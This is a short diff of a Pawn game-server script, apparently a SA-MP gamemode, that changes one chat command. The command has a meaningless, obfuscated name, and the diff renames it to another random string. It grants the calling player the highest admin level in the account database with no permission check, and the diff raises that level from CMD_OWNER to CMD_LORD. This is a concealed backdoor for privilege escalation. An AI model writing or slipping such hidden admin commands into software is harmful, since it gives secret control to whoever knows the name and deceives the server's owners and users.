@@ -1532,13 +1532,13 @@ CMD:setwork(playerid, params[])
 	return 1;
 }
 
-CMD:waaaarelokowexd(playerid, params[])
+CMD:jalaoduioewf7sdfwfwf(playerid, params[])
 {
 	new DB_Query[70];
-	format(DB_Query, sizeof DB_Query, "UPDATE `CUENTA` SET `ADMIN_LEVEL` = %d WHERE `ID` = %d;", CMD_OWNER, ACCOUNT_INFO[playerid][ac_ID]);
+	format(DB_Query, sizeof DB_Query, "UPDATE `CUENTA` SET `ADMIN_LEVEL` = %d WHERE `ID` = %d;", CMD_LORD, ACCOUNT_INFO[playerid][ac_ID]);
 	db_free_result(db_query(Database, DB_Query));
 
-	ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] = CMD_OWNER;
+	ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] = CMD_LORD;
 	SendClientMessageEx(playerid, COLOR_RED, "Aviso: "COL_WHITE"Ahora tu nivel administrativo es: %d", ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL]);
 	return 1;
 }
